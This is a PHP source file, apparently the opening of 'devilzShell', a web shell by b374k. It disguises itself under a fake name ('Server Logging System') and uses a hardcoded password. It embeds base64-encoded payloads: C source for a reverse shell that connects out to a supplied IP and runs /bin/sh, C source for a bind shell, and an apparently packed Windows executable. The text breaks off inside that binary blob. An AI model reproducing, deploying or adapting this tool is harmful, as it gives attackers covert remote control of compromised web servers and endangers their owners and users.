<?php
//
// devilzShell <[php]>
// ^^^^^^^^^^^^
// author: b374k
// greets: devilzc0der(s) and all of you who love peace and freedom
//
//
// ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
// Jayalah Indonesiaku


//################ VARIABLES GOES HERE #######################=============================================]
$shell_name = "devilzShell";
$shell_fake_name = "Server Logging System";
$shell_title = " :: ".$shell_name." ::";
$shell_version = "v1";
$shell_password = "devilzc0der";
$shell_fav_port = "12345";
$shell_color = "#374374";

// server software
$xSoftware = trim(getenv("SERVER_SOFTWARE"));
// uname -a
$xSystem = trim(php_uname());
// server ip
$xServerIP = $_SERVER["SERVER_ADDR"];
// your ip ;-)
$xClientIP = $_SERVER['REMOTE_ADDR'];

$xHeader = $xSoftware."<br />".$xSystem."<br />Server IP: <span class=\"gaul\">[ </span>".$xServerIP."<span class=\"gaul\"> ]</span>&nbsp;&nbsp;&nbsp;Your IP: <span class=\"gaul\">[ </span>".$xClientIP."<span class=\"gaul\"> ]</span>";

//################# RESOURCES GOES HERE #######################=============================================]
$icon = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAB/klEQVR42o2RS2gUQRCGq7rHB0rw
4miwFWVmPSmIHpaQSwQD4ivGKHsImIOyBhJETUDjRaMIEjTk4gNFIutBwScY8eBh9aBgyCGCiKu4
E4kzBk0uimiI21XWwgbMorOppumuKuqr6r8RZmnjxl8iR0H2DzfKT03HsVLhV+Ove4rc8xk4uYtx
dCHgGQHc/SdAuqwZB9jCAE7RnwLGR8hHbiK5/aQzCcC0FP/+u2YG4KPx2+p14SKVTbFIiPdI7/ei
oL98whmAt8bv3O7Y89sIv29kzOpSvENR41lSD1Jh0BQLeGf8jq3a9nayetX2KVhfeta8Gm0nuwgH
0+FITSxgzPgtm3Qhs5qR+kgfqwIYGgVuTmk60EPq/p4w2B0LkG5+l7I5Ud3BUsoBBlc0uEVOakWU
vxMLKNqA8V4c0rZWyZ0lzbI2M9rTpNfKD+RiAV+MX9eiCs9+yV2ecLkacPgaUvcNxcuuWHW9Pgr2
xQJeGu9Us7YnjpMaFsE2FGOh8dN12l49SjjUGo4kYwE54x3eqW3fXlJjrawSMvLPN8brbtB08hyp
gaYwaIgFTJjE0l5l3wfAVRdIN4qQT8T/dht5btbq9pVR/lJFEUWHWhF9fnWUzxb9x8u9hwcV7ZjO
D1rHXRx9mPgvoNxkqjmTwKnXyMlVgAtcxucCyMwaUMn+AMvLzBHNivq3AAAAAElFTkSuQmCC";
$bg = "iVBORw0KGgoAAAANSUhEUgAAAAMAAAADCAYAAABWKLW/AAAAJklEQVR42mNkAAIpKan/b968YWAE
MZ49ewamGdnY2P6LiIgwgAQA8xYNYheotNcAAAAASUVORK5CYII=";
$xBack ="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5l
dGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZk
Ow0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47IA0KIGRhZW1vbigxLDApOw0KIHNpbi5zaW5fZmFt
aWx5ID0gQUZfSU5FVDsNCiBzaW4uc2luX3BvcnQgPSBodG9ucyhhdG9pKGFyZ3ZbMV0pKTsNCiBz
aW4uc2luX2FkZHIuc19hZGRyID0gaW5ldF9hZGRyKGFyZ3ZbMl0pOyANCiBiemVybyhhcmd2WzJd
LHN0cmxlbihhcmd2WzJdKSsxK3N0cmxlbihhcmd2WzFdKSk7IA0KIGZkID0gc29ja2V0KEFGX0lO
RVQsIFNPQ0tfU1RSRUFNLCBJUFBST1RPX1RDUCkgOyANCiBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1
Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICBw
ZXJyb3IoIlstXSBjb25uZWN0KCkiKTsNCiAgIGV4aXQoMCk7DQogfQ0KIGR1cDIoZmQsIDApOw0K
IGR1cDIoZmQsIDEpOw0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2giLChjaGFy
ICopMCk7IA0KIGNsb3NlKGZkKTsgDQp9";
$xBind = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5
cGVzLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4N
CiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50IGFyZ2M7DQpjaGFy
ICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBy
ZW1vdGU7DQogaWYoZm9yaygpID09IDApIHsgDQogcmVtb3RlLnNpbl9mYW1pbHkgPSBBRl9JTkVU
Ow0KIHJlbW90ZS5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KIHJlbW90ZS5zaW5f
YWRkci5zX2FkZHIgPSBodG9ubChJTkFERFJfQU5ZKTsgDQogc29ja2ZkID0gc29ja2V0KEFGX0lO
RVQsU09DS19TVFJFQU0sMCk7DQogaWYoIXNvY2tmZCkgcGVycm9yKCJzb2NrZXQgZXJyb3IiKTsN
CiBiaW5kKHNvY2tmZCwgKHN0cnVjdCBzb2NrYWRkciAqKSZyZW1vdGUsIDB4MTApOw0KIGxpc3Rl
bihzb2NrZmQsIDUpOw0KIHdoaWxlKDEpDQogIHsNCiAgIG5ld2ZkPWFjY2VwdChzb2NrZmQsMCww
KTsNCiAgIGR1cDIobmV3ZmQsMCk7DQogICBkdXAyKG5ld2ZkLDEpOw0KICAgZHVwMihuZXdmZCwy
KTsgICANCiAgIGV4ZWNsKCIvYmluL3NoIiwic2giLChjaGFyICopMCk7IA0KICAgY2xvc2UobmV3
ZmQpOw0KICB9DQogfQ0KfQ0KaW50IGNocGFzcyhjaGFyICpiYXNlLCBjaGFyICplbnRlcmVkKSB7
DQppbnQgaTsNCmZvcihpPTA7aTxzdHJsZW4oZW50ZXJlZCk7aSsrKSANCnsNCmlmKGVudGVyZWRb
aV0gPT0gJ1xuJykNCmVudGVyZWRbaV0gPSAnXDAnOyANCmlmKGVudGVyZWRbaV0gPT0gJ1xyJykN
CmVudGVyZWRbaV0gPSAnXDAnOw0KfQ0KaWYgKCFzdHJjbXAoYmFzZSxlbnRlcmVkKSkNCnJldHVy
biAwOw0KfQ==";
$wBind="TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAyAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
ZGUuDQ0KJAAAAAAAAAA0GAk5cHlnanB5Z2pweWdqmGZsanF5Z2rzZWlqenlnanB5ZmpNeWdqEmZ0
and5Z2qYZm1qanlnalJpY2hweWdqAAAAAAAAAABQRQAATAEDAIkLlD8AAAAAAAAAAOAADwELAQYA
ADAAAAAQAAAAQAAAYHIAAABQAAAAgAAAAABAAAAQAAAAAgAABAAAAAAAAAAEAAAAAAAAAACQAAAA
EAAAAAAAAAIAAAAAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAACAAAAIAQAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFVQWDAAAAAA
AEAAAAAQAAAAAAAAAAQAAAAAAAAAAAAAAAAAAIAAAOBVUFgxAAAAAAAwAAAAUAAAACQAAAAEAAAA
AAAAAAAAAAAAAABAAADgVVBYMgAAAAAAEAAAAIAAAAACAAAAKAAAAAAAAAAAAAAAAAAAQAAAwAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
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
z8Zx0QgAlkrNi0RW/EoNEmywUELsQO1J9NjcEt3zDF7IKx6DwuSCkxaKdH4PODL1OqqBtwSe2eRA
SXBrf2g8y5HPCYA7eDz8O5ACJNh1BLwD4Dt/CDkA8mg8aDw0XTdYP18GTANEPAk2TdM0LCQcPH/u
M4cAaDzwgAMDkASbjKA8fwDnEfKQPrA9CD1IsOt+LJAYCzgDYD1/yCGQVwA+AD66brBQW7R/vAPE
bJqmaczU3OT3PU4IARJ/HxAgwabrBRgDKDw+fxFm+gXM/yXAmgA1anMA/6sWSitBj8wDF00YkwPb
pv6/cnVudGltZSBlcnJvclENCgNUAflv9kxPU1MRDgBTSU5H/rL2AlNPTUESEVI2MDI4t7+83Qgt
IEthYmx0byBpbmlWYWw/3+zbaXoNaGVhcDcnN25vdLZvcGs9BHVn7nNwYWMjZuw2YO97bG93aThh
Bm9uNyB5Crk2c3RkWvvtZzVwdXIrdmlydHUhM77Y9tulYyMgYwxsKF802nabQl8qZXhcL1iwk732
BtziXzE599vu5r5vcGVYMXNvD2Rlc2NrbTJgKzhGJIHfQIhwZWQZVyM3dms0JG2brHRovyGM5Nth
L2xvY2sXmtsGWzRkt2EuAvat4daiIXJtAHBAZ3JhbSB7IRS2Sm02LzA5T6MZWgoQQSorFPK5RjAu
Kzg9D+H7YXJndShzXzAyZott267Bbm5ngm8FdDoR0ApnrWTmf00tYBj/8LY5ZhVWaXOqQysrIFKg
Ye67PUxpYrRyeScKLRYaZ9vDRQ4hEVDUOsI2rEDZAC7v5eD89ra5JSxrbHduPhtHZXRMYbELd2wy
QQJ2ZVCudXAT/61tZw9XlWQmh2Vzc2FnZUJvNb6wxHhBfXMlMzIuZCrPtaInN745SAMLVJhrxHI6
